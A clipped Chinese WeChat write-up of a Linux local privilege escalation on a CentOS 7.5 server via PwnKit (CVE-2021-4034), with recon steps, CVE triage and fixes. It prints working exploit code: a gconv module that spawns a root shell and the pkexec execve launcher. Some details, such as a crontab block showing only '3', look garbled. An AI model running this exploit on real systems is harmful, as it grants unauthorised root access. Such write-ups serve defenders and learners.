---
title: 【微信】记一次完整的Linux本地提权实战
source: https://mp.weixin.qq.com/s/gtEKHRR6WNSjfzn24nYI4Q
source_host: mp.weixin.qq.com
clip_date: 2026-10-15T15:58:43+08:00
trace_id: b838fefc-f95a-4475-8d7d-a0a500832cb6
content_hash: 2099efa305ee9110983ada192a7d392d078cfcac6b75ace91e6acf08d7320b3d
status: synced
tags:
  - 微信
  - Linux安全
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: CentOS 7.5（内核 3.10.0-862）上的受限用户 ekp 通过 CVE-2021-4034（PwnKit）利用 pkexec 成功本地提权至 root。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3fa75244-d011-815f-8421-fc53a9eebc94
ioc:
  cves:
    - CVE-2016-5195
    - CVE-2017-7308
    - CVE-2018-14634
    - CVE-2021-4034
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> CentOS 7.5（内核 3.10.0-862）上的受限用户 ekp 通过 CVE-2021-4034（PwnKit）利用 pkexec 成功本地提权至 root。
> 
> - **攻击面梳理：** 先收集内核与发行版版本、SUID 二进制（`find / -perm -4000`）、crontab 自定义 root 任务与 Capabilities；cron 对应二进制目录不可写、`getcap` 无结果、`sudo -l` 需密码，均放弃，最终锁定 SUID 的 `/usr/bin/pkexec`。
> - **漏洞筛选：** 按内核子版本交叉比对补丁时间线——DirtyCow（CVE-2016-5195）与 AF_PACKET（CVE-2017-7308）在 3.10.0-514 已修复；CVE-2018-14634 理论可行但需大量 vma，机器仅约 2GB 内存导致进程卡死；确认 `polkit-0.112-26.el7` 未含修复，PwnKit 可用。
> - **PwnKit 原理：** 以 `argv=NULL`（argc=0）调用 pkexec，使循环不执行且 argv[1] 越界指向 envp[0]，环境变量清洗逻辑随之错乱，令 `GCONV_PATH`、`CHARSET`、`SHELL` 等危险变量逃逸进 SUID 进程。
> - **利用要点：** GLib 处理消息时按 CHARSET 调用 iconv_open，从 `GCONV_PATH` 加载恶意 gconv 模块，其 `gconv_init()` 以 root 权限执行并 `setuid(0)` + 起 shell；目录名 `GCONV_PATH=.` 含等号配合 `PATH=GCONV_PATH=.` 用于通过路径校验。
> - **踩坑与修复：** gconv-modules 字段须用 tab 分隔、变量必须由 C 程序 execve 传入而非 shell export；修复方式为升级 polkit 至 `0.112-26.el7_9.1`，或临时 `chmod 0755 /usr/bin/pkexec` 去除 SUID 位。

**开心网安** *2026年10月15日 15:40*

由于传播、利用本公众号开心网安所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号开心网安及作者不为 **此** 承担任何责任，一旦造成后果请自行承担！如需要转载等，请标注文章来源。如有侵权烦请告知，我们会立即删除并致歉，谢谢！

## 概述

本文记录了一次针对某企业内网 CentOS 7.5 服务器的完整本地提权过程。目标机器内核版本 `3.10.0-862.el7` ，当前用户 `ekp` 权限受限（uid=996，无sudo权限），最终通过 **CVE-2021-4034（PwnKit）** 成功提权至 root。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3ad3151361043065.png)

> **目标环境**：CentOS Linux release 7.5.1804 (Core) / Linux ekp-app1 3.10.0-862.el7.x86_64 / 当前用户 uid=996(ekp) 非root 无sudo

### 一、信息收集与攻击面分析

拿到一个受限用户 shell 后，第一件事不是直接跑 exp，而是系统性梳理攻击面。

#### 1.1 基础环境

```bash
uname -a
# Linux ekp-app1 3.10.0-862.el7.x86_64
cat /etc/redhat-release
# CentOS Linux release 7.5.1804 (Core)
id
# uid=996(ekp) gid=993(ekp) groups=993(ekp)
#内核属于 2018年4月RHEL 7.5发布版本。3.10 主线经历了大量 CVE 修复，需逐一排查哪些漏洞在该子版本上仍可利用。
```

#### 1.2 SUID 二进制

```typescript
find / -perm -4000 -type f 2>/dev/null
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3aaa0d57f334b1ad.png)

输出中值得关注的条目：\`/usr/bin/pkexec\`、\`/usr/bin/passwd\`、\`/usr/bin/sudo\`、\`/usr/bin/at\` 等。其中 \`pkexec\` 是后续突破的关键。

#### 1.3 定时任务

```bash
cat /etc/crontab
```

发现一个自定义 root 任务：

```apache
3
```

关联 `systemctl cat ctcss` 发现服务二进制路径 `/var/ctcss/bin/ctcss-agentd` ，但目录权限检查后不可写，此路径放弃。

#### 1.4 Capabilities 与 sudo

```bash
getcap -r / 2>/dev/null    # 空结果
sudo -l                      # 需密码，不可用
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/136d8dc85caec5af.png)

* * *

### 二、漏洞筛选与尝试

根据内核版本 `3.10.0-862` ，筛选出理论上可利用的提权漏洞：

| CVE | 名称  | 影响版本 | 是否有效 | 原因  |
| --- | --- | --- | --- | --- |
| CVE-2016-5195 | DirtyCow | < 3.10.0-514 | ❌   | 该内核已打补丁 |
| CVE-2017-7308 | AF_PACKET | < 3.10.0-514.16.1 | ❌   | 同上  |
| CVE-2018-14634 | create_elf_tables | 3.10.0-862 | ⚠️ 理论可行 | 需大量内存，实际执行卡死 |
| CVE-2021-4034 | PwnKit | polkit < 0.112-26.el7_9.x | ✅   | polkit-0.112-26.el7 未修复 |

#### 2.1 CVE-2018-14634 尝试（失败分析）

基于Qualys 发布的 create_elf_tables()整数溢出漏洞理论上覆盖 3.10.0-862。exp 通过精心构造的 argv/envp 使内核在 execve时发生栈溢出，绕过 SUID 二进制对LD_PRELOAD的清理。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5600cba60e35d374.png)

编译执行后 **进程直接卡死**。原因：该 exp 需要耗尽内存映射数量，触发 `mmap` 大量匿名页面（约 32K 个 vma），目标机器内存不足导致长时间无响应。后续 `free -h` 确认可用内存仅约 2GB，不满足 exp 对 MAP_COUNT 的操纵需求。

#### 2.2 CVE-2016-5195 尝试（补丁验证）

DirtyCow 竞态条件漏洞在内核 3.10.0-514 已修复，3.10.0-862 已包含补丁。出于严谨，仍编译 exp 验证—— `/proc/self/mem` 写入失败，确认不可利用。

#### 2.3 CVE-2021-4034 分析（最终突破）

确认 polkit 版本：

```nginx
rpm -q polkit
# polkit-0.112-26.el7.x86_64
#该版本属于 RHEL 7.9 基线，但 未包含 _9.1 后缀的安全修复，仍存在 PwnKit 漏洞。
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/51b6196c7a06676a.png)

* * *

### 三、PwnKit（CVE-2021-4034）漏洞原理

#### 3.1 漏洞本质

`pkexec` 是 Polkit 提供的 SUID-root 程序，用于以其他用户身份执行命令。漏洞核心在于其参数解析逻辑：

```cs
// pkexec.c (伪代码还原)
int main(int argc, char *argv[]) {
    // ...
    for (n = 1; n < (guint) argc; n++) {
        // 处理 argv[n]
    }
    // ...
}
```

```
当 argc == 0 时（通过 execve 传入 argv = NULL），循环条件 n < argc 为 1 < 0 即 false，循环不执行——但此时 argv[1] 已经越界指向了 envp[0]。后续代码中对 argv[n] 的读取会越界到环境变量数组，导致参数来自环境变量。
```

#### 3.2 利用链

```cpp
攻击者 --execve(NULL, crafted_envp)--> pkexec (SUID-root)
    │
    ├─ argv[1] OOB → 读取 envp[0]="pwnkit"（伪装成程序名）
    ├─ 环境变量清洗因 argv=NULL 而逻辑错乱
    │    ├─ GCONV_PATH=./pwnkit  未被清理
    │    ├─ CHARSET=PWNKIT       未被清理
    │    └─ SHELL=pwnkit         未被清理
    │
    └─ GLib 处理消息时调用 iconv_open("UTF-8", "PWNKIT")
         │
         └─ GCONV_PATH 指向的 gconv-modules 被加载
              │
              └─ pwnkit.so 中的 gconv_init() 被调用（root权限）
                   │
                   └─ setuid(0) → execve("/bin/sh") → ROOT SHELL
```

#### 3.3 关键代码

**恶意 gconv 模块** （编译为 pwnkit.so）：

```cpp
void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    char *a[] = { "/bin/sh", "-p", NULL };
    char *e[] = { "PATH=/bin:/usr/bin", NULL };
    execve("/bin/sh", a, e);
    exit(0);
}
```

**exp 主体**：

```cpp
int main(void) {
    // 搭建 GCONV_PATH 目录与 gconv-modules
    system("mkdir -p GCONV_PATH=.");
    system("touch GCONV_PATH=./pwnkit");
    system("chmod +x GCONV_PATH=./pwnkit");
    system("mkdir -p pwnkit");

    FILE *fp = fopen("pwnkit/gconv-modules", "w");
    fprintf(fp, "module\tUTF-8//\tPWNKIT//\tpwnkit\t2\n");
    fclose(fp);

    // 编译 .so（此处省略 gconv_init 代码的写入与编译）

    char *envp[] = {
        "pwnkit",                     // 伪装程序名，被 argv[1] 越界读到
        "PATH=GCONV_PATH=.",          // 使 pkexec 在 GCONV_PATH=. 目录查找
        "CHARSET=PWNKIT",             // 触发字符集转换请求
        "SHELL=pwnkit",               // 辅助绕过
        "GCONV_PATH=./pwnkit",        // gconv 模块搜索路径（未被清理）
        "GIO_USE_VFS=",               // 辅助绕过
        NULL
    };
    char *argv[] = { NULL };          // argc=0 触发 OOB

    execve("/usr/bin/pkexec", argv, envp);
}
```

> **`mkdir -p "GCONV_PATH=."` —— 目录名包含等号**：这是绕过 pkexec 安全检查的关键技巧。 `PATH=GCONV_PATH=.` 使该目录加入 PATH，pkexec 在其中找到 `pwnkit` 可执行文件并通过了路径安全校验。

#### 3.4 利用中踩过的坑

| 问题  | 现象  | 原因  | 解决  |
| --- | --- | --- | --- |
| gconv 模块加载失败 | `Could not open converter from "UTF-8" to "PWNKIT"` | `gconv-modules` 中字段分隔符需用 **tab** 而非空格 | 改用 `printf '\t'` |
| GCONV_PATH 被清理 | 同上  | shell 直接 export 的变量会被 pkexec 清洗 | 通过 C 程序的 `execve` 传入 envp，配合 argv=NULL 绕过 |
| passwd 换行符错 | paramiko/auth 失败 | Windows CRLF 导致私钥解析异常 | 转换为 LF 并确保末尾换行 |

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/370b6384a5e46629.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/65fa7aed0039d634.png)

**最终执行结果**：也是成功上线root得吃！

```bash
./pk
bash-4.2# id
uid=0(root) gid=0(root) groups=0(root)
```

四、漏洞修复方案

1.  **升级 polkit**： `yum update polkit` → `polkit-0.112-26.el7_9.1` 或更新
    
2.  **临时缓解** （无法立即升级）： `chmod 0755 /usr/bin/pkexec` 移除 SUID 位（注意影响依赖 pkexec 的桌面环境）
    
3.  **通用加固**：定期 `yum update` ，删除或限制不必要的 SUID 二进制
    

* * *

## 总结

1.  **信息收集是提权的基石**：内核版本 → 补丁时间线交叉比对 → 锁定有效 CVE，比盲目尝试 exp 高效得多。
    
2.  **`argv=NULL` 是 PwnKit 的灵魂**：正常调用 pkexec 时环境变量会被清洗，但传入空 argv 导致清洗逻辑错乱，让 GCONV_PATH、CHARSET 等危险变量"泄漏"进 SUID 进程。
    
3.  **gconv 模块加载是常规提权路径**：GLib/gconv 的 `gconv_init` 函数在模块加载时自动执行，且继承调用者权限。这在 PwnKit 之前就曾在其他漏洞中出现，值得在审计时重点关注。
    

### 防御建议

-   定期内核与用户态组件更新，优先覆盖已知高危 CVE
    
-   审计所有 SUID 二进制，移除非必要的
    
-   监控对 `/usr/bin/pkexec` 的 `execve` 调用（特别是 `argv=NULL` 的情况）
    
-   部署 HIDS 检测异常进程行为（普通用户进程执行 SUID 程序后直接启动 shell）
    

## 附录：

| 序号  | 对应漏洞/内容 | 官方链接 |
| --- | --- | --- |
| 1   | CVE-2021-4034 (PwnKit) — polkit pkexec 本地提权漏洞 | https://nvd.nist.gov/vuln/detail/CVE-2021-4034 |
| 2   | CVE-2018-14634 (Mutagen Astronomy) — `create_elf_tables()` 整数溢出漏洞 | https://access.redhat.com/security/cve/cve-2018-14634 |
| 3   | CVE-2016-5195 (DirtyCow) — Linux 内核 COW 竞态条件提权漏洞 | https://access.redhat.com/security/vulnerabilities/DirtyCow |
| 4   | CentOS 7.5 内核 3.10.0-862 安全更新公告（含 CVE-2018-14634 修复） | https://access.redhat.com/errata/RHSA-2018:2748 |

src随笔文章 · 目录

作者提示: 个人观点，仅供参考
